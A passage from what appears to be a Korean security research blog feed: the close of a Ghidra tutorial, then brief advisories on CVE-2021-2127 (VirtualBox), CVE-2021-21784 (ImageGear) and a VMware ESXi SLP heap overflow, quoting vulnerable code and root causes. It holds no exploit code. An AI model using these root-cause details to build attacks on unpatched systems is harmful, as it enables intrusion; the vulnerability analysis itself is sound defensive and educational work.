&#xC800;&#xC7A5;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2029.png" alt></p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2030.png" alt></p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2031.png" alt></p><p>&#xC591;&#xD53C;&#xC9C0; &#xBAA8;&#xC591;&#xC744; &#xD074;&#xB9AD;&#xD558;&#xACE0; Python &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC791;&#xC131;&#xD560; &#xAC83;&#xC774;&#xB2C8; Python&#xC744; &#xCCB4;&#xD06C;&#xD558;&#xACE0; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xC774;&#xB984;&#xC744; &#xC785;&#xB825;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; &#xCD94;&#xAC00;&#xD55C; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xAC00; &#xC5EC;&#xB7EC; &#xAC1C;&#xB77C;&#xBA74; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xC120;&#xD0DD; &#xBD80;&#xBD84;&#xC5D0; &#xC5EC;&#xB7EC; &#xAC1C;&#xC758; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xAC00; &#xB728;&#xACA0;&#xC8E0;? :) OK &#xBC84;&#xD2BC;&#xC744; &#xD074;&#xB9AD;&#xD574;&#xC90D;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2032.png" alt></p><p>&#xC774;&#xB7F0; &#xC2DD;&#xC73C;&#xB85C; &#xD3B8;&#xC9D1;&#xCC3D;&#xC774; &#xB728;&#xACE0; &#xC6D0;&#xD558;&#xB294; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC791;&#xC131;&#xB9CC; &#xD558;&#xBA74; &#xB418;&#xB294; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2033.png" alt></p><p>&#xCF54;&#xB4DC;&#xB97C; &#xC791;&#xC131;&#xD558;&#xACE0; &#xC800;&#xC7A5;&#xD55C; &#xD6C4; &#xC2E4;&#xD589;&#xC2DC;&#xCF1C;&#xBD05;&#xC2DC;&#xB2E4;!</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2034.png" alt></p><p>&#xC544;&#xB798; &#xCF58;&#xC194; &#xCC3D;&#xC5D0; <code>hello.py</code>&#xAC00; &#xC2E4;&#xD589;&#xB3FC;&#xC11C; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xBB38;&#xAD6C;&#xAC00; &#xB728;&#xB294; &#xAC83;&#xC744; &#xBCF4;&#xC2E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="&#xBA54;&#xBAA8;&#xB9AC;-&#xB9F5;"><a href="#&#xBA54;&#xBAA8;&#xB9AC;-&#xB9F5;" class="headerlink" title="&#xBA54;&#xBAA8;&#xB9AC; &#xB9F5;"></a>&#xBA54;&#xBAA8;&#xB9AC; &#xB9F5;</h1><p>&#xC774;&#xC81C; &#xBC8C;&#xC368; &#xB9C8;&#xC9C0;&#xB9C9;&#xC774;&#xB124;&#xC694;&#x2026; &#xBA54;&#xBAA8;&#xB9AC; &#xB9F5;&#xC785;&#xB2C8;&#xB2E4;. &#xB9AC;&#xBC84;&#xC2F1;&#xC744; &#xD558;&#xAC70;&#xB098; &#xC544;&#xB2C8;&#xBA74; &#xD3EC;&#xB108;&#xBE14;&#xC744; &#xD558;&#xB2E4; &#xBCF4;&#xBA74; &#xBA54;&#xBAA8;&#xB9AC; &#xBE14;&#xB85D;&#xB4E4;&#xC774; &#xC5B4;&#xB5A0;&#xD55C; &#xAD8C;&#xD55C;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xC57C; &#xD560; &#xB54C;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD639;&#xC740; Base Address&#xAC00; &#xBCC0;&#xACBD;&#xB418;&#xC5C8;&#xC744; &#xB54C; &#xD568;&#xC218;&#xAC00; &#xC5B4;&#xB5A4; &#xC8FC;&#xC18C;&#xB97C; &#xAC16;&#xB294;&#xC9C0; &#xACC4;&#xC0B0;&#xC744; &#xD574;&#xC57C; &#xD560; &#xB54C;&#xB3C4; &#xC788;&#xC8E0;. &#xADF8;&#xB7F4; &#xB54C; &#xC5ED;&#xC2DC; &#xB2E4;&#xB978; &#xB3C4;&#xAD6C;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xACE0; ghidra&#xC5D0;&#xC11C; &#xD574;&#xCE58;&#xC6B8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2035.png" alt></p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2036.png" alt></p><p>Window - Memory Map&#xC744; &#xD074;&#xB9AD;&#xD558;&#xC5EC; &#xBA54;&#xBAA8;&#xB9AC; &#xB9F5;&#xC744; &#xC2E4;&#xD589; &#xD558;&#xBA74; &#xC704;&#xC640; &#xAC19;&#xC740; &#xCC3D;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC5B4;&#xB5A4; &#xBE14;&#xB85D;&#xC774; &#xBB34;&#xC2A8; &#xAD8C;&#xD55C;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xB294;&#xC9C0;, &#xCD08;&#xAE30;&#xD654;&#xAC00; &#xB418;&#xC5B4;&#xC788;&#xB294;&#xC9C0; &#xB4F1;&#xC774; &#xBAA8;&#xB450; &#xD45C;&#xC2DC;&#xB418;&#xC8E0;. &#xBCA0;&#xC774;&#xC2A4; &#xC8FC;&#xC18C;&#xB97C; &#xBCC0;&#xACBD;&#xD55C; &#xCC44;&#xB85C; &#xD568;&#xC218; &#xC8FC;&#xC18C;&#xB4E4;&#xC744; &#xD655;&#xC778;&#xD558;&#xACE0; &#xC2F6;&#xC73C;&#xBA74; &#xC0C1;&#xB2E8;&#xC758; &#xC9D1; &#xBAA8;&#xC591;&#xC744; &#xB20C;&#xB7EC;&#xC11C; Base Address&#xB97C; &#xC218;&#xC815;&#xD574;&#xC8FC;&#xAE30;&#xB9CC; &#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2037.png" alt></p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2038.png" alt></p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2039.png" alt></p><p>Base Image Address&#xB97C; 0&#xC73C;&#xB85C; &#xBC14;&#xAFB8;&#xC5B4; &#xBC84;&#xB838;&#xB354;&#xB2C8; &#xBAA8;&#xB4E0; &#xD568;&#xC218;&#xB4E4;&#xC774; &#xC624;&#xD504;&#xC14B; &#xC8FC;&#xC18C;&#xB85C;&#xB9CC; &#xD45C;&#xC2DC;&#xB418;&#xB294; &#xBAA8;&#xC2B5;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="The-End"><a href="#The-End" class="headerlink" title="The End"></a>The End</h1><p>&#xC624;&#xB298;&#xC740; &#xB370;&#xC774;&#xD130; &#xBCC0;&#xD658;, &#xB370;&#xC774;&#xD130; &#xD0C0;&#xC785; &#xC801;&#xC6A9;, &#xD568;&#xC218; &#xD638;&#xCD9C; &#xD2B8;&#xB9AC;/&#xADF8;&#xB798;&#xD504;, &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xB9E4;&#xB2C8;&#xC800;, &#xBA54;&#xBAA8;&#xB9AC; &#xB9F5;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC54C;&#xC544;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC81C; ghidra&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB294; &#xBAA8;&#xB4E0; &#xC0AC;&#xC6A9;&#xBC95;&#xC744; &#xD68D;&#xB4DD;&#xD55C; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBB34;&#xC11C;&#xC6B4; &#xC6A9;&#xC774;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xACE0; &#xB808;&#xC774;&#xB4DC; &#xD560; &#xC0DD;&#xAC01;&#xC5D0; &#xB4E4;&#xB5A0; &#xC788;&#xC5C8;&#xB294;&#xB370; &#xC0DD;&#xAC01;&#xBCF4;&#xB2E4; &#xC2F1;&#xAC70;&#xC6E0;&#xB124;&#xC694;.</p><p>&#xD558;&#xC9C0;&#xB9CC;! &#xC6D0;&#xB798; &#xBAAC;&#xC2A4;&#xD130;&#xB97C; &#xD55C; &#xBC88; &#xC218;&#xB835; &#xD588;&#xC73C;&#xBA74; &#xC774;&#xC81C; &#xC790;&#xC798;&#xD55C; &#xD301;&#xC774;&#xB098; TA(&#xD0C0;&#xC784;&#xC5B4;&#xD0DD;)&#xC744; &#xD558;&#xB294; &#xAC83;&#xC774; &#xAC15;&#xD638;&#xC758; &#xB3C4;&#xB9AC;! The End&#xB77C;&#xB294; &#xBB38;&#xAD6C;&#xB9CC; &#xBCF4;&#xACE0; &#xB05D;&#xB0AC;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xC168;&#xB2E4;&#xBA74;<del>(&#xB05D;&#xB098;&#xAE38; &#xBC14;&#xB77C;&#xC168;&#xC744; &#xC218;&#xB3C4; &#xC788;&#xACA0;&#xC9C0;&#xB9CC;)</del> &#xC11C;&#xC6B4;&#xD569;&#xB2C8;&#xB2E4;&#x2026; &#xB2E4;&#xC74C; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; IDA Pro&#xB97C; &#xC0AC;&#xC6A9;&#xD588;&#xB358; &#xC0AC;&#xC6A9;&#xC790;&#xB4E4;&#xC5D0; &#xB300;&#xD55C; ghidra Tips &#xBAA8;&#xC74C;&#xC9D1;&#xC744; &#xB4E4;&#xACE0; &#xC624;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC; &#xB2E4;&#xB4E4; &#xC88B;&#xC740; &#xD558;&#xB8E8; &#xBCF4;&#xB0B4;&#xC2DC;&#xAE38; &#xBC14;&#xB78D;&#xB2C8;&#xB2E4;!</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.shogunlab.com/blog/2019/12/22/here-be-dragons-ghidra-1.html">https://www.shogunlab.com/blog/2019/12/22/here-be-dragons-ghidra-1.html</a></p><p><a href="https://ghidra.re/courses/GhidraClass/Intermediate/Scripting_withNotes.html#Scripting.html">https://ghidra.re/courses/GhidraClass/Intermediate/Scripting_withNotes.html#Scripting.html</a></p><p><a href="https://ghidra-sre.org/CheatSheet.html">https://ghidra-sre.org/CheatSheet.html</a></p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>reversing</tag>
      
      <tag>ghidra</tag>
      
      <tag>ghidra tutorials</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-2127: Oracle VirtualBox Divide by Zero DoS</title>
    <link href="/2021/03/06/fabu1ous/2021-03-06/"/>
    <url>/2021/03/06/fabu1ous/2021-03-06/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://candymate.tistory.com/20?category=964271">CVE-2021-2127</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Oracle VirtualBox 6.1.16 (realease 2020/11/17)</p><p>Windows &#xD638;&#xC2A4;&#xD2B8; &#xC81C;&#xC678;</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Oracle VirtualBox 6.1.16&#xC5D0;&#xC11C; Divide by zero &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. VMWare SVGA II PCI&#xB97C; &#xD1B5;&#xD574; &#xC804;&#xB2EC;&#xB41C; &#xCEE4;&#xB9E8;&#xB4DC;&#xB4E4;&#xC740; SVGA command buffer&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xD6C4; FIFO loop&#xC744; &#xD1B5;&#xD574; &#xD30C;&#xC2F1; &#xBC0F; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;. &#xD568;&#xC218; <code>vmsvgaR3FifoLoop</code>&#xB294; switch-case&#xBB38;&#xC744; &#xD1B5;&#xD574; &#xC0C1;&#xD669;&#xC5D0; &#xB9DE;&#xB294; <code>vmsvga~</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xCEE4;&#xB9E8;&#xB4DC;&#xB97C; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xC911; <code>SVGA_3D_CMD_SURFACE_DMA</code> &#xCEE4;&#xB9E8;&#xB4DC;&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xB294; <code>vmsvga3dSurfaceDMA</code>&#xC5D0;&#xC11C; divide by zero &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c++">AssertReturn(srcz &lt; UINT32_MAX / pMipLevel-&gt;mipmapSize.<span class="hljs-built_in">height</span> / cbGuestPitch, VERR_INVALID_PARAMETER);</code></pre><p>&#xC704;&#xB294; Divide by zero &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xC774;&#xACE0;, Root cause&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><p>Invalid surface&#xAC00; &#xC815;&#xC758;&#xB420; &#xC218; &#xC788;&#xC74C;.</p><p><code>mipmap</code>&#xC758; &#xAC12;&#xC774; 0&#xC774; &#xC544;&#xB2C8;&#xBA70;, <code>cbGuestPitch</code>&#xC758; &#xAC12;&#xC774; 0&#xC778; surface&#xAC00; &#xC815;&#xC758;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li><li><p>Texture&#xB294; Invalid surface&#xC5D0; bound &#xB428;</p><p>Texture&#xAC00; surface&#xC5D0; bound &#xB418;&#xC5B4;&#xC57C; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB3C4;&#xB2EC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p></li><li><p>&#xC81C;&#xC218;(divisor)&#xC758; &#xAC80;&#xC0AC; &#xBD80;&#xC7AC;</p></li></ol><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD1B5;&#xD574; 3D acceleration &#xC635;&#xC158;&#xC774; &#xCF1C;&#xC838; &#xC788;&#xB294; VM&#xB4E4;&#xC744; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xB85C;&#xCEEC; &#xD639;&#xC740; &#xC6D0;&#xACA9; Crash&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>dos</tag>
      
      <tag>divide by zero</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-21784: Accusoft ImageGear의 OOB write를 통한 임의 코드 실행 취약점</title>
    <link href="/2021/03/05/l0ch/2021-03-05/"/>
    <url>/2021/03/05/l0ch/2021-03-05/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://talosintelligence.com/vulnerability_reports/TALOS-2021-1248">Accusoft ImageGear JPG format SOF marker processing out-of-bounds write vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Accusoft ImageGear &#x2264; 19.8</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Accusoft&#xC758; ImageGear &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC5D0;&#xC11C; JPG &#xD3EC;&#xB9F7;&#xC758; &#xD30C;&#xC77C;&#xC744; &#xCC98;&#xB9AC;&#xD560; &#xB54C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; OOB write &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD1B5;&#xD55C; &#xC784;&#xC758; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. ImageGear&#xB294; &#xC774;&#xBBF8;&#xC9C0; &#xBCC0;&#xD658;, &#xC0DD;&#xC131;, &#xD3B8;&#xC9D1;, &#xC8FC;&#xC11D; &#xB4F1;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xC774;&#xBBF8;&#xC9C0; &#xD234;&#xD0B7;&#xC774;&#xBA70; DICOM, PDF, Microsoft Office &#xB4F1; 100&#xAC1C; &#xC774;&#xC0C1;&#xC758; &#xD615;&#xC2DD;&#xC744; &#xC9C0;&#xC6D0;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; JPG&#xD30C;&#xC77C; &#xB85C;&#xB4DC; &#xACFC;&#xC815;&#xC758; <code>handle_color_channel_with_high_precision</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handle_color_channel_with_high_precision</span><span class="hljs-params">(undefined4 param_1,<span class="hljs-keyword">int</span> width,<span class="hljs-keyword">short</span> *param_3,</span></span><span class="hljs-function"><span class="hljs-params">                                <span class="hljs-keyword">short</span> *param_,<span class="hljs-keyword">short</span> *param_5,<span class="hljs-keyword">short</span> *raster_buffer,<span class="hljs-keyword">int</span> param_7,<span class="hljs-keyword">int</span> param_8)</span></span><span class="hljs-function"></span>{   [...]  <span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> &lt; width) {raster_buffer = raster_buffer + <span class="hljs-number">2</span>;<span class="hljs-keyword">do</span> {...<span class="hljs-keyword">if</span> (short_3 &lt; <span class="hljs-number">0</span>){short_3 = <span class="hljs-number">0</span>;}<span class="hljs-keyword">else</span> {<span class="hljs-keyword">if</span> (<span class="hljs-number">0xfff</span> &lt; short_3)short_3 = <span class="hljs-number">0xfff</span>;}raster_buffer[<span class="hljs-number">-2</span>] = (<span class="hljs-keyword">short</span>)short_3;<span class="hljs-keyword">if</span> (short_2 &lt; <span class="hljs-number">0</span>){short_2 = <span class="hljs-number">0</span>;}<span class="hljs-keyword">else</span> {<span class="hljs-keyword">if</span> (<span class="hljs-number">0xfff</span> &lt; short_2)short_2 = <span class="hljs-number">0xfff</span>;}raster_buffer[<span class="hljs-number">-1</span>] = (<span class="hljs-keyword">short</span>)short_2;<span class="hljs-keyword">if</span> (short_1 &lt; <span class="hljs-number">0</span>){short_1 = <span class="hljs-number">0</span>;}<span class="hljs-keyword">else</span> {<span class="hljs-keyword">if</span> (<span class="hljs-number">0xfff</span> &lt; short_1)short_1 = <span class="hljs-number">0xfff</span>;}*raster_buffer = (<span class="hljs-keyword">short</span>)short_1;      ...raster_buffer = raster_buffer + <span class="hljs-number">3</span>;width = width + <span class="hljs-number">-1</span>;} <span class="hljs-keyword">while</span> (width != <span class="hljs-number">0</span>);}<span class="hljs-keyword">return</span>;}</code></pre><p>&#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xD568;&#xC218;&#xB294; <code>width</code>&#xC758; &#xD06C;&#xAE30;&#xB9CC;&#xD07C; &#xBC18;&#xBCF5;&#xBB38;&#xC744; &#xB3CC;&#xBA70; <code>raster_buffer</code>&#xC5D0; &#xBCF5;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;. <code>width</code>&#xB294; JPG &#xD30C;&#xC77C;&#xC758; &#xD5E4;&#xB354; &#xC694;&#xC18C;&#xC778; SOF(Start Of Frame, JPG &#xD30C;&#xC77C;&#xC758; &#xD06C;&#xAE30; &#xBC0F; &#xC0D8;&#xD50C;&#xB9C1; &#xC815;&#xBCF4;) &#xB9C8;&#xCEE4;&#xC5D0;&#xC11C; &#xAC00;&#xC838;&#xC624;&#xB294;&#xB370;, <code>raster_buffer</code>&#xC640; <code>width</code>&#xC758; &#xD06C;&#xAE30; &#xAC80;&#xC0AC;&#xB97C; &#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xD574;&#xCEE4;&#xAC00; SOF &#xB9C8;&#xCEE4;&#xB97C; &#xC870;&#xC791;&#xD574; <code>raster_buffer</code>&#xC758; &#xD06C;&#xAE30;&#xAC00; SOF &#xB9C8;&#xCEE4;&#xC5D0;&#xC11C; &#xD30C;&#xC2F1; &#xD55C; <code>width</code>&#xC5D0; 3&#xC744; &#xACF1;&#xD55C; &#xAC12;&#xBCF4;&#xB2E4; &#xC791;&#xC73C;&#xBA74; buffer overflow&#xB85C; &#xC778;&#xD574; &#xBC94;&#xC704;&#xB97C; &#xBC97;&#xC5B4;&#xB09C; &#xC4F0;&#xAE30;&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xBA70; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>oob</tag>
      
      <tag>bof</tag>
      
      <tag>rce</tag>
      
      <tag>buffer overflow</tag>
      
      <tag>out-of-bounds</tag>
      
      <tag>L0ch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] SLP heap overflow를 통한 VMware ESXi pre-auth RCE 취약점</title>
    <link href="/2021/03/04/idioth/2021-03-04/"/>
    <url>/2021/03/04/idioth/2021-03-04/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.thezdi.com/blog/2021/3/1/cve-2020-3992-amp-cve-2021-21974-pre-auth-remote-code-execution-in-vmware-esxi">CVE-2020-3992 &amp; CVE-2021-21974: PRE-AUTH REMOTE CODE EXECUTION IN VMWARE ESXI</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>VMware ESXi<ul><li>7.0 before ESXi70U1c-17325551</li><li>6.7 before ESXi670-202102401-SG</li><li>6.5 before ESXi650-202102101-SG</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>VMware ESXi&#xC5D0;&#xC11C; pre-authentication remote code execution &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; Service Location Protocol(SLP) &#xC11C;&#xBE44;&#xC2A4;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>Service Location Protocol(SLP)&#xB294; VMware ESXi &#xAE30;&#xBCF8; &#xC124;&#xCE58; &#xC2DC; TCP&#xC640; UDP&#xC758; 427 &#xD3EC;&#xD2B8;&#xB97C; &#xB9AC;&#xC2A4;&#xB2DD;&#xD558;&#xB294; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC11C;&#xBE44;&#xC2A4;&#xC785;&#xB2C8;&#xB2E4;. VMware&#xB294; OpenSLP 1.0.1&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xAE30;&#xB2A5;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xC5EC; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xAD6C;&#xD604;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xC11C;&#xBE44;&#xC2A4;&#xB294; &#xC778;&#xC99D; &#xC5C6;&#xC774; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; input&#xC744; &#xAD6C;&#xBB38; &#xBD84;&#xC11D;&#xD558;&#xACE0; root &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xD558;&#xBBC0;&#xB85C; ESXi SLP &#xC11C;&#xBE44;&#xC2A4;&#xC758; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD1B5;&#xD574; pre-auth remote code execution&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>VMware&#xC758; SLP &#xCF54;&#xB4DC;&#xC758; &#xC77C;&#xBD80;&#xBD84;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">SLPParseSrvUrl</span><span class="hljs-params">(<span class="hljs-keyword">int</span> srvurllen, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *srvurl, _QWORD *a3)</span></span><span class="hljs-function"></span>{<span class="hljs-comment">// ...</span>  obuf = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1u</span>LL, srvurllen + <span class="hljs-number">53L</span>L);  <span class="hljs-keyword">if</span> ( !obuf )    <span class="hljs-keyword">return</span> <span class="hljs-number">12L</span>L;  v6 = <span class="hljs-built_in">strstr</span>(srvurl, <span class="hljs-string">&quot;:/&quot;</span>);        <span class="hljs-comment">// &lt;-- out-of-bounds string search</span>  <span class="hljs-keyword">if</span> ( !v6 )  {    <span class="hljs-built_in">free</span>(obuf);    <span class="hljs-keyword">return</span> <span class="hljs-number">22L</span>L;  }  <span class="hljs-built_in">memcpy</span>((<span class="hljs-keyword">char</span> *)obuf + <span class="hljs-number">41</span>, srvurl, v6 - srvurl);  <span class="hljs-comment">// &lt;-- heap overflow</span><span class="hljs-comment">// ...</span>}</code></pre><p><code>srvurl</code>&#xC740; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; input&#xC744; &#xD1B5;&#xD574; &#xBC1B;&#xB294; &#xAC12;&#xC774;&#xC9C0;&#xB9CC; &#xD568;&#xC218;&#xC5D0;&#xC11C; <code>strstr()</code>&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xC804;&#xC5D0; <code>srvurl</code>&#xC758; &#xB05D;&#xC5D0; NULL &#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xBC94;&#xC704; &#xBC16;&#xC758; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xAC80;&#xC0AC;&#xD558;&#xC5EC; <code>memcpy</code> &#xBD80;&#xBD84;&#xC5D0;&#xC11C; heap overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>SLP&#xB97C; &#xD1B5;&#xD574; Remote Code Execution&#xC744; &#xD558;&#xAE30; &#xC704;&#xD574; SLP&#xC5D0;&#xC11C; &#xC1A1;&#xC218;&#xC2E0;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; <code>struct SLPBuffer</code>&#xC758; &#xAD6C;&#xC870;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs arduino"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">SLPBuffer</span></span><span class="hljs-class">{</span>    SLPListItem listitem;    <span class="hljs-keyword">size_t</span>  allocated;    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>*   start;    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>*   curpos;    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>*   <span class="hljs-built_in">end</span>;    <span class="hljs-comment">// buffer data is appended</span>}*SLPBuffer;<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">SLPDSocket</span></span><span class="hljs-class">{</span>    SLPListItem         listitem;    <span class="hljs-keyword">int</span>                 fd;    <span class="hljs-keyword">time_t</span>              age;    <span class="hljs-keyword">int</span>                 state;<span class="hljs-comment">// ...</span>    SLPBuffer           recvbuf; <span class="hljs-comment">/* 